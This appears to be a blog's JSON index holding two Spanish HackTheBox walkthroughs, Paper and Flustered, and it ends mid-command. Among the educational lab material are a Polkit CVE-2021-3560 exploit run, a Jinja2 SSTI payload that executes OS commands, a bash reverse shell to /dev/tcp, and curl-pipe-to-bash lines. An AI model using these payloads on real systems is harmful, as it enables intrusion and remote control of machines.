[ { "title": "HTB - Paper", "url": "/posts/paper/", "categories": "HTB", "tags": "Information Leakage, WordPress, Rocket Chat Bot, Polkit (CVE-2021-3560)", "date": "2022-06-18 00:00:00 +0200", "snippet": "En este post veremos la resolucion detallada de la maquina Paper, tiene un nivel de dificultad facil. Es bastante sencilla y buena para quien esta empezando.Veremos las siguientes técnicas a lo largo de la resolución: Information Leakage Abussing WordPress - Unauthenticated View Private/Draft Posts Abusing Rocket Chat Bot Polkit (CVE-2021-3560) [Privilege Escalation]”Reconocimiento.Realizamos un ping a la máquina víctima para comprobar que tenemos traza ICMP y averiguar el S.O mediante el TTL:┌─[root@h4cknet]─[/home/w0lfst/HTB/Paper]└──╼ #ping -c 1 10.10.11.143PING 10.10.11.143 (10.10.11.143) 56(84) bytes of data.64 bytes from 10.10.11.143: icmp_seq=1 ttl=63 time=67.9 ms--- 10.10.11.143 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 67.949/67.949/67.949/0.000 msTenemos conexion y estamos ante una máquina Linux, ya que su TTL es menor de 64.Escaneo de puertos┌─[root@h4cknet]─[/home/w0lfst/HTB/Paper]└──╼ #nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.143 -oG allPortsStarting Nmap 7.92 ( https://nmap.org ) at 2022-02-12 20:51 CETInitiating SYN Stealth Scan at 20:51Scanning 10.10.11.143 [65535 ports]Discovered open port 80/tcp on 10.10.11.143Discovered open port 22/tcp on 10.10.11.143Discovered open port 443/tcp on 10.10.11.143Completed SYN Stealth Scan at 20:51, 10.65s elapsed (65535 total ports)Nmap scan report for 10.10.11.143Host is up, received user-set (0.065s latency).Scanned at 2022-02-12 20:51:46 CET for 11sNot shown: 65532 closed tcp ports (reset)PORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 6380/tcp open http syn-ack ttl 63443/tcp open https syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 10.77 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB) En mis apuntes encontrarás más detalladamente que hace cada parámetro del comando.Utilizaremos la utilidad extractPorts de s4vitar para extraer los puertos del resultado y que se copien automaticamente a la clipboard.┌─[root@h4cknet]─[/home/w0lfst/HTB/Paper]└──╼ #extractPorts allPorts [*] Extracting information... [*] IP Address: 10.10.11.143 [*] Open ports: 22,80,443[*] Ports copied to clipboardEscaneo de servicios que corren cada puerto.Lanzamos un nmap indicando que queremos lanzar unos scripts básicos de enumeración, para así averiguar más información acerca de los puertos abiertos.┌─[✗]─[root@h4cknet]─[/home/w0lfst/HTB/Paper]└──╼ #nmap -sCV -p22,80,443 10.10.11.143 -oN targetedStarting Nmap 7.92 ( https://nmap.org ) at 2022-02-12 20:53 CETNmap scan report for 10.10.11.143Host is up (0.042s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.0 (protocol 2.0)| ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)| 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)|_ 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28| http-methods: |_ Potentially risky methods: TRACE|_http-title: HTTP Server Test Page powered by CentOS|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9443/tcp open ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)|_ssl-date: TLS randomness does not represent time|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US| Subject Alternative Name: DNS:localhost.localdomain| Not valid before: 2021-07-03T08:52:34|_Not valid after: 2022-07-08T10:32:34| http-methods: |_ Potentially risky methods: TRACE|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28| tls-alpn: |_ http/1.1|_http-title: HTTP Server Test Page powered by CentOSService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 29.56 seconds Puerto Servicio Version 22 ssh OpenSSH 8.0 80 http Apache httpd 2.4.37 443 ssl/http Apache httpd 2.4.37 whatweb.Analizaremos la web con la herramienta whatweb para obtener más información:┌─[w0lfst@h4cknet]─[~/HTB/Paper]└──╼ $whatweb http://10.10.11.143http://10.10.11.143 [403 Forbidden] Apache[2.4.37][mod_fcgid/2.3.9], Country[RESERVED][ZZ], Email[webmaster@example.com], HTML5, HTTPServer[CentOS][Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9], IP[10.10.11.143], MetaGenerator[HTML Tidy for HTML5 for Linux version 5.7.28], OpenSSL[1.1.1k], PoweredBy[CentOS], Title[HTTP Server Test Page powered by CentOS], UncommonHeaders[x-backend-server], X-Backend[office.paper]Llama la atención X-Backend[office.paper], parece un dominio. Lo añadimos al /etc/hosts para ver si se está aplicando virtual hosting:Efectivamente, como resultado vemos una nueva web.Analizando sitio nuevo.La página está hecha con WordPress.Analizamos un poco la página y encontramos tres usuarios, dos de ellos son válidos en el login de wordpress.Usuarios válidos en el login: prisonmike. nick.Luego observamos en un artículo un comentario que dice:Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!Esto llama mucho la atención, así que procedemos a buscar la versión de WordPress con la extensión de Wappalyzer (también podemos saberlo mirando el código fuente de la web). La versión es 5.2.3.Utilizaremos searchsploit para encontrar alguna vulnerabilidad que podamos aprovechar:┌─[root@h4cknet]─[/home/w0lfst/HTB/Paper/content]└──╼ #searchsploit wordpress 5.2.3------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------WordPress Core 5.2.3 - Cross-Site Host Modification | php/webapps/47361.plWordPress Core &amp;lt; 5.2.3 - Viewing Unauthenticated/Password/Private Posts | multiple/webapps/47690.mdWordPress Core &amp;lt; 5.3.x - &#39;xmlrpc.php&#39; Denial of Service | php/dos/47800.pyWordPress Plugin DZS Videogallery &amp;lt; 8.60 - Multiple Vulnerabilities | php/webapps/39553.txtWordPress Plugin iThemes Security &amp;lt; 7.0.3 - SQL Injection | php/webapps/44943.txtWordPress Plugin Rest Google Maps &amp;lt; 7.11.18 - SQL Injection | php/webapps/48918.sh------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------Shellcodes: No ResultsY encontramos una forma de ver los posts ocultos.Explotando vulnerabilidad.Examinamos WordPress Core &amp;lt; 5.2.3 - Viewing Unauthenticated/Password/Private Posts:searchsploit -x multiple/webapps/47690.mdNos dice que si añadimos ?static=1 al final de la url veremos los post ocultos:Registro en subdominio.En los posts ocultos encontramos un subdominio. Lo añadimos chat.office.paper al /etc/hosts e introducimos la url en una nueva pestaña:Explorando el chat general vemos que hay implementado un bot. Abrimos un nuevo chat privado con el. Por seguridad, solo podemos ver ficheros de la carpeta sales, pero si probamos a hacer un list ../ podemos ver los ficheros del home:El bot está desarrollado con hubot. Buscamos la documentación y allí vemos que el bot necesita un archivo .env con algunas variables. Una de ellas es la contraseña del bot:export ROCKETCHAT_URL=&#39;http://127.0.0.1:48320&#39;export ROCKETCHAT_USER=recyclopsexport ROCKETCHAT_PASSWORD=Queenofblad3s!23export ROCKETCHAT_USESSL=falseexport RESPOND_TO_DM=trueexport RESPOND_TO_EDITED=trueexport PORT=8000export BIND_ADDRESS=127.0.0.1Tenemos una contraseña Queenofblad3s!23.Acceso a la máquina.Probaremos a conectarnos por ssh con el usuario propietario (dwight) del fichero:ssh dwight@10.10.11.143¡Estamos dentro! Ya podemos visualizar la flag para introducirla en HackTheBox.Escalar privilegios.Enumerando las distintas maneras posibles de escalar privilegios no encontramos nada interesante. Utilizaremos linpeas para que haga un reconocimiento más a fondo:Primero, abro un servidor en mí máquina:python3 -m http.server 8080Luego, hacemos un curl a nuestro servidor para que ejecute linpeas sin descargarlo en la máquina víctima:curl http://tu-ip:8080/linpeas.sh | bashNos reporta que tiene una vulnerabilidad, la cual, puede ser explotada con el CVE-2021-3560.Utilizamos el exploit hecho por el propio creador de esta máquina:./CVE-2021-3560.sh -u=w0lfst -p=w0lfst[!] Username set as : w0lfst[!] No Custom Timing specified.[!] Timing will be detected Automatically[!] Force flag not set.[!] Vulnerability checking is ENABLED![!] Starting Vulnerability Checks...[!] Checking distribution...[!] Detected Linux distribution as &quot;centos&quot;[!] Checking if Accountsservice and Gnome-Control-Center is installed[+] Accounts service and Gnome-Control-Center Installation Found!![!] Checking if polkit version is vulnerable[+] Polkit version appears to be vulnerable!![!] Starting exploit...[!] Inserting Username w0lfst...Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required[+] Inserted Username w0lfst with UID 1005![!] Inserting password hash...[!] It looks like the password insertion was succesful![!] Try to login as the injected user using su - w0lfst[!] When prompted for password, enter your password [!] If the username is inserted, but the login fails; try running the exploit again.[!] If the login was succesful,simply enter &#39;sudo bash&#39; and drop into a root shell!Después de ejecutarlo, se crea un nuevo usuario con permisos sudo.Iniciamos la sesión con este usuario y ejecutamos sudo root para convertirnos en root.¡Ya tenemos control total! Y podemos visualizar la flag del usuario root. Exploits y contenido: En mi github encontrarás el script autopwn.py y los archivos de reconocimiento." }, { "title": "HTB - Flustered", "url": "/posts/flustered/", "categories": "HTB", "tags": "Information Leakage, Squid Proxy, GlusterFS, SSTI, Azure Storage", "date": "2022-02-16 00:00:00 +0100", "snippet": "Resolución detallada de la maquina Flustered. Veremos las siguientes técnicas: Abusing Squid Proxy Abusing GlusterFS Information Leakage Server Side Template Injection (SSTI)[RCE] Abusing Azure StorageReconocimiento.Comprobación conexión y TTL.Realizamos un ping a la maquina victima para comprobar que tenemos traza ICMP y averiguar el S.O mediante el TTL:┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]└──╼ #ping -c 1 10.10.11.131PING 10.10.11.131 (10.10.11.131) 56(84) bytes of data.64 bytes from 10.10.11.131: icmp_seq=1 ttl=63 time=34.1 ms--- 10.10.11.131 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 34.110/34.110/34.110/0.000 msTenemos conexión y estamos ante una maquina linux.Escaneo de puertos.Utilizaremos nmap para escanear todos los puertos que tiene abiertos la maquina victima:┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]└──╼ #nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.11.131 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-15 22:50 CETInitiating SYN Stealth Scan at 22:50Scanning 10.10.11.131 [65535 ports]Discovered open port 22/tcp on 10.10.11.131Discovered open port 80/tcp on 10.10.11.131Discovered open port 111/tcp on 10.10.11.131Discovered open port 24007/tcp on 10.10.11.131Discovered open port 49153/tcp on 10.10.11.131Discovered open port 3128/tcp on 10.10.11.131Discovered open port 49152/tcp on 10.10.11.131Completed SYN Stealth Scan at 22:50, 10.42s elapsed (65535 total ports)Nmap scan report for 10.10.11.131Host is up, received user-set (0.040s latency).Scanned at 2022-02-15 22:50:17 CET for 10sNot shown: 65528 closed tcp ports (reset)PORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 6380/tcp open http syn-ack ttl 63111/tcp open rpcbind syn-ack ttl 633128/tcp open squid-http syn-ack ttl 6324007/tcp open unknown syn-ack ttl 6349152/tcp open unknown syn-ack ttl 6349153/tcp open unknown syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 10.56 seconds Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.621MB) En mis apuntes encontraras mas detalladamente que hace cada parámetro del comando.Utilizamos la herramienta extractPorts hecha por s4vitar para ver mejor los puertos encontrados y que se copien automáticamente a la clipboard:┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]└──╼ #extractPorts allPorts [*] Extracting information... [*] IP Address: 10.10.11.131 [*] Open ports: 22,80,111,3128,24007,49152,49153[*] Ports copied to clipboardLanzamos un whatweb pero no encontramos gran cosa:┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]└──╼ $whatweb http://10.10.11.131http://10.10.11.131 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.2], IP[10.10.11.131], Title[steampunk-era.htb - Coming Soon], nginx[1.14.2]Escaneo de servicios que corren cada puerto.┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]└──╼ #nmap -sCV -p22,80,111,3128,24007,49152,49153 10.10.11.131 -oN targetedStarting Nmap 7.92 ( https://nmap.org ) at 2022-02-15 22:52 CETNmap scan report for 10.10.11.131Host is up (0.052s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 93:31:fc:38:ff:2f:a7:fd:89:a3:48:bf:ed:6b:97:cb (RSA)| 256 e5:f8:27:4c:38:40:59:e0:56:e7:39:98:6b:86:d7:3a (ECDSA)|_ 256 62:6d:ab:81:fc:d2:f7:a1:c1:9d:39:cc:f2:7a:a1:6a (ED25519)80/tcp open http nginx 1.14.2|_http-title: steampunk-era.htb - Coming Soon|_http-server-header: nginx/1.14.2111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind|_ 100000 3,4 111/udp6 rpcbind3128/tcp open http-proxy Squid http proxy 4.6|_http-title: ERROR: The requested URL could not be retrieved|_http-server-header: squid/4.624007/tcp open rpcbind49152/tcp open ssl/unknown| ssl-cert: Subject: commonName=flustered.htb| Not valid before: 2021-11-25T15:27:31|_Not valid after: 2089-12-13T15:27:31|_ssl-date: TLS randomness does not represent time49153/tcp open rpcbindService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 66.79 seconds Puerto Servicio Version 22 ssh OpenSSH 7.9 80 http nginx 1.14.2 111 rpcbind 2-4 3128 http-proxy Squid http proxy 4.6 24007 rpcbind - 49152 ssl/unknown - 49153 rpcbind - Añadimos los dos nombres de dominio encontrados al /etc/hosts. flustered.htb y steampunk-era.htb.En la web no vemos nada de diferente entre los distintos dominios.Analizando proxy.Vemos que hay un Squid http proxy 4.6. A lo mejor, tiene un servicio http por el puerto 80 que pasando a traves del proxy nos permita listar un contenido diferente.Con curl hay un parámetro que es --proxy a traves del cual podemos indicar el proxy por el cual podemos pasar y luego tratar de realizar una petición.curl --proxy http://10.10.11.131:3129 http://127.0.0.1Al estar pasando por un proxy estamos haciendo referencia al localhost de la maquina victima y no al nuestro.Si ejecutamos el comando anterior vemos cosas, pero, nos pone access denied porque necesitamos autenticarnos.GlusterFS.Seguimos analizando mas puertos, por ejemplo, el 24007.Esto es GlusterFS (FileSystem)Vamos a instalarnos glusterfs-client y glusterfs-server para analizar el servicio.┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]└──╼ #gluster --remote-host=10.10.11.131 volume listvol1vol2Nos reporta que hay dos volúmenes. A continuación, montaremos el vol1 para ver que contiene. Creamos una carpeta en /mnt, en mi caso, sera /mnt/flustered. Ejecutamos la montura:┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]└──╼ #mount -t glusterfs 10.10.11.131:/vol1 /mnt/flustered/Mount failed. Check the log file for more details.Se produce un error, analicemos el log /var/log/glusterfs/mnt-flustered.log…Nos da un problema de DNS, no logra saber que es flustered. Para solucionar este problema nos iremos al /etc/hosts y añadiremos el host flustered. Volvemos a ejecutar el comando, pero, nos da otro error distinto.0-vol1-client-0: could not load our cert at /etc/ssl/glusterfs.pemEsta buscando certificados en el /etc/ssl de nuestro equipo, en este caso, poco podemos hacer ya que no tenemos ese fichero.Probamos con el vol2 y esto es lo que vemos:┌─[root@h4cknet]─[/mnt/flustered]└──╼ #ls -latotal 122938drwx------ 6 Debian-exim ntp 4096 oct 25 14:52 .drwxr-xr-x 1 root root 18 feb 15 23:13 ..-rw-rw---- 1 Debian-exim ntp 16384 oct 25 14:52 aria_log.00000001-rw-rw---- 1 Debian-exim ntp 52 oct 25 14:52 aria_log_control-rw-r--r-- 1 root root 0 oct 25 14:43 debian-10.3.flag-rw-rw---- 1 Debian-exim ntp 998 ene 28 12:23 ib_buffer_pool-rw-rw---- 1 Debian-exim ntp 12582912 oct 25 14:52 ibdata1-rw-rw---- 1 Debian-exim ntp 50331648 oct 25 14:52 ib_logfile0-rw-rw---- 1 Debian-exim ntp 50331648 oct 25 14:37 ib_logfile1-rw-rw---- 1 Debian-exim ntp 12582912 feb 15 15:59 ibtmp1-rw-rw---- 1 Debian-exim ntp 0 oct 25 14:43 multi-master.infodrwx------ 2 Debian-exim ntp 4096 oct 25 14:43 mysql-rw-rw---- 1 root root 16 oct 25 14:43 mysql_upgrade_infodrwx------ 2 Debian-exim ntp 4096 oct 25 14:43 performance_schemadrwx------ 2 Debian-exim ntp 4096 oct 25 14:44 squid-rw-rw---- 1 Debian-exim ntp 24576 feb 15 15:59 tc.logAbrimos mysql_upgrade_info:┌─[root@h4cknet]─[/mnt/flustered]└──╼ #strings mysql_upgrade_info10.3.31-MariaDBDocker mysql.Montaremos un docker con esta versión de mysql y meteremos todos estos archivos para ver las bases de datos. Seguimos los siguientes pasos:┌─[root@h4cknet]─[/tmp]└──╼ #mkdir mysql┌─[root@h4cknet]─[/tmp]└──╼ #cd !$cd mysql┌─[root@h4cknet]─[/tmp/mysql]└──╼ #cp -R /mnt/flustered/* .┌─[root@h4cknet]─[/tmp/mysql]└──╼ #docker run --name mariadb -v /tmp/mysql:/var/lib/mysql -d mariadb:10.3.31Unable to find image &#39;mariadb:10.3.31&#39; locally10.3.31: Pulling from library/mariadb7b1a6ab2e44d: Pull complete 034655750c88: Pull complete f0b757a2a0f0: Pull complete 5c37daf8b6b5: Pull complete b4cd9409b0f6: Pull complete dbcda06785eb: Pull complete a34cd90f184c: Pull complete 55c0df9b2fca: Pull complete e2a4d476ce21: Pull complete 6592280ea514: Pull complete 0ede5dfe32b4: Pull complete Digest: sha256:22834b9671a1e89b74e0cc0bc285fd33425ba2641afe86cb3afd5d8617245b81Status: Downloaded newer image for mariadb:10.3.31cfe8a82e69fe7de0a4da4e8ba077a7020382c1a5928b941fb6a43e4e07be7d1┌─[root@h4cknet]─[/tmp/mysql]└──╼ #docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEmariadb 10.3.31 439df5ac9582 4 months ago 386MBA la hora de desplegar el contenedor todo lo que hay en mysql en /tmp/mysql me lo va a montar en /var/lib/mysql del contenedor (“maquina victima”). Con el parámetro -d indicamos la version exacta de mariadb que queremos utilizar.Trataremos de forma interactiva obtener una bash de mariadb y comprobar que todo esta bien:┌─[root@h4cknet]─[/tmp/mysql]└──╼ #docker exec -it mariadb bashroot@cfe8a82e69fe:/# hostname -I 172.17.0.2root@cfe8a82e69fe:/# ls /var/lib/mysql/aria_log.00000001 debian-10.3.flag ib_logfile0 ibdata1 multi-master.info mysql_upgrade_info squidaria_log_control ib_buffer_pool ib_logfile1 ibtmp1 mysql performance_schema tc.loEstamos en el docker y podemos ver los archivos que hemos indicado anteriormente para que se copiaran.Si intentamos lanzar un mysql en vez de una bash nos da el siguiente error:┌─[root@h4cknet]─[/tmp/mysql]└──╼ #docker exec -it mariadb mysqlERROR 1524 (HY000): Plugin &#39;unix_socket&#39; is not loaSolucionemos este problema. En la ruta /etc/mysql/mariadb.conf.d crearemos el siguiente archivo:root@cfe8a82e69fe:/etc/mysql/mariadb.conf.d# nano socket.cnfroot@cfe8a82e69fe:/etc/mysql/mariadb.conf.d# cat socket.cnf [mariadb]plugin-load-add = auth_socket.soroot@cfe8a82e69fe:/etc/mysql/mariadb.conf.d# Salimos del docker con CTRL+D y reiniciamos el docker:┌─[✗]─[root@h4cknet]─[/tmp/mysql]└──╼ #docker stop mariadb mariadb┌─[root@h4cknet]─[/tmp/mysql]└──╼ #docker start mariadb mariadbNos ejecutamos mysql y funcionara perfectamente:docker exec -it mariadb mysqlVeamos las bases de datos y su contenido:MariaDB [(none)]&amp;gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || squid |+--------------------+4 rows in set (0.000 sec)MariaDB [(none)]&amp;gt; use squid;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [squid]&amp;gt; show tables;+-----------------+| Tables_in_squid |+-----------------+| passwd |+-----------------+1 row in set (0.000 sec)MariaDB [squid]&amp;gt; select * from passwd;+----------------+---------------+---------+----------------+---------+| user | password | enabled | fullname | comment |+----------------+---------------+---------+----------------+---------+| lance.friedman | o&amp;gt;WJ5-jD&amp;lt;5^m3 | 1 | Lance Friedman | |+----------------+---------------+---------+----------------+---------+1 row in set (0.000 sec)MariaDB [squid]&amp;gt;La base de datos se llama squid, con lo cual, entendemos que es para el proxy que encontramos antes. Ademas, tenemos usuario y contraseña, asi que, vamos a probar a conectarnos al proxy con esas credenciales.Conexión a proxy.┌─[✗]─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]└──╼ #curl --proxy &#39;http://lance.friedman:o&amp;gt;WJ5-jD&amp;lt;5^m3@10.10.11.131:3128&#39; http://127.0.0.1&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Welcome to nginx!&amp;lt;/title&amp;gt;&amp;lt;style&amp;gt; body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; }&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Welcome to nginx!&amp;lt;/h1&amp;gt;&amp;lt;p&amp;gt;If you see this page, the nginx web server is successfully installed andworking. Further configuration is required.&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;For online documentation and support please refer to&amp;lt;a href=&quot;http://nginx.org/&quot;&amp;gt;nginx.org&amp;lt;/a&amp;gt;.&amp;lt;br/&amp;gt;Commercial support is available at&amp;lt;a href=&quot;http://nginx.com/&quot;&amp;gt;nginx.com&amp;lt;/a&amp;gt;.&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;em&amp;gt;Thank you for using nginx.&amp;lt;/em&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;La cosa ha cambiado, ya no nos pone access denied y vemos una nueva pagina de nginx.Analizando directorios.Analicemos los directorios con gobuster:┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]└──╼ #gobuster dir --proxy &#39;http://lance.friedman:o&amp;gt;WJ5-jD&amp;lt;5^m3@10.10.11.131:3128&#39; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://127.0.0.1Error: error on creating gobusterdir: proxy URL is invalid (parse &quot;http://lance.friedman:o&amp;gt;WJ5-jD&amp;lt;5^m3@10.10.11.131:3128&quot;: net/url: invalid userinfo)A pesar de estar bien puesto, nos salta un error con la url. Los símbolos especiales los pondremos en hexadecimal, con man ascii vemos la tabla y su correspondiente código. Quedaría algo asi:┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]└──╼ #gobuster dir -t 200 --proxy &#39;http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128&#39; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://127.0.0.1===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://127.0.0.1[+] Method: GET[+] Threads: 200[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] Proxy: http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/02/16 00:20:14 Starting gobuster in directory enumeration mode===============================================================/app (Status: 301) [Size: 185] [--&amp;gt; http://127.0.0.1/app/] ===============================================================2022/02/16 00:21:14 Finished===============================================================Nos reporta /app. Vamos a buscar en ese directorio (http://127.0.0.1/app) archivos con extensiones .py.┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]└──╼ #gobuster dir -t 200 --proxy &#39;http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128&#39; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://127.0.0.1/app -x py===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://127.0.0.1/app[+] Method: GET[+] Threads: 200[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] Proxy: http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128[+] User Agent: gobuster/3.1.0[+] Extensions: py[+] Timeout: 10s===============================================================2022/02/16 00:24:20 Starting gobuster in directory enumeration mode===============================================================/templates (Status: 301) [Size: 185] [--&amp;gt; http://127.0.0.1/app/templates/]/static (Status: 301) [Size: 185] [--&amp;gt; http://127.0.0.1/app/static/] /app.py (Status: 200) [Size: 748] /config (Status: 301) [Size: 185] [--&amp;gt; http://127.0.0.1/app/config/] ===============================================================2022/02/16 00:26:25 Finished===============================================================Nos encuentra varias cosas, voy a ver el app.py.curl -s --proxy &#39;http://lance.friedman:o&amp;gt;WJ5-jD&amp;lt;5^m3@10.10.11.131:3128&#39; http://127.0.0.1/app/app.py | batcat -l py NOTA: batcat lo utilizo para ver mejor el codigo, no es necesario ejecutarlo.Viendo el codigo encontramos que podemos controlar el output de la web:┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]└──╼ #curl -s -X POST &quot;http://10.10.11.131/&quot; -H &quot;Content-type: application/json&quot; -d &#39;{&quot;siteurl&quot;: &quot;test&quot;}&#39; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;test - Coming Soon&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body style=&quot;background-image: url(&#39;/static/steampunk-3006650_1280.webp&#39;);background-size: 100%;background-repeat: no-repeat;&quot;&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;Burpsuite.Nos abrimos BurpSuite para probar Jinja2 - Basic injection. Primero tenemos que lanzar el curl y mandarlo al proxy de burpsuite:curl -s -X POST &quot;http://10.10.11.131/&quot; -H &quot;Content-type: application/json&quot; -d &#39;{&quot;siteurl&quot;: &quot;{{7*7}}&quot;}&#39; --proxy http://127.0.0.1:8080Modificamos la peticion por lo siguiente:Y nos responde correctamente.Ejecución de comandos.¿Como ejecutamos comandos con esto?Intentamos lanzarnos un ping a nuestra maquina. Para ello, nos pondremos en escucha tcpdump -i tun0 icmp -n y ejecutamos lo siguiente:┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]└──╼ #curl -s -X POST &quot;http://10.10.11.131/&quot; -H &quot;Content-type: application/json&quot; -d &#39;{&quot;siteurl&quot;: &quot;{% for x in ().__class__.__base__.__subclasses__() %}{% if \\&quot;warning\\&quot; in x.__name__ %}{{x()._module.__builtins__[\\&quot;__import__\\&quot;](\\&quot;os\\&quot;).system(\\&quot;ping -c 1 10.10.16.8\\&quot;)}}{%endif%}{%endfor%}&quot;}&#39; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;0 - Coming Soon&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body style=&quot;background-image: url(&#39;/static/steampunk-3006650_1280.webp&#39;);background-size: 100%;background-repeat: no-repeat;&quot;&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;Por aqui recibimos la traza:┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered/content]└──╼ #tcpdump -i tun0 icmp -ntcpdump: verbose output suppressed, use -v[v]... for full protocol decodelistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes01:01:14.409631 IP 10.10.11.131 &amp;gt; 10.10.16.8: ICMP echo request, id 30669, seq 1, length 6401:01:14.409663 IP 10.10.16.8 &amp;gt; 10.10.11.131: ICMP echo reply, id 30669, seq 1, length 64Ahora vamos a ganar acceso a la maquina. Nos creamos un index.html que en realidad tendra codigo en bash:┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered/content]└──╼ #cat index.html #!/bin/bashbash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.8/443 0&amp;gt;&amp;amp;1Lanzamos un servidor en python para que la maquina victima se conecte y obtenga el index.html:python3.9 -m http.server 80Nos ponemos en escucha, en mi caso, por el puerto 443:nc -nvlp 443Lanzamos el comando remoto para que la maquina se conecte a la nuestra:┌─[root@h4cknet]─[/home/w0lfst/HTB/Flustered]└──╼ #curl -s -X POST &quot;http://10.10.11.131/&quot; -H &quot;Content-type: application/json&quot; -d &#39;{&quot;siteurl&quot;: &quot;{% for x in ().__class__.__base__.__subclasses__() %}{% if \\&quot;warning\\&quot; in x.__name__ %}{{x()._module.__builtins__[\\&quot;__import__\\&quot;](\\&quot;os\\&quot;).system(\\&quot;curl 10.10.16.8 | 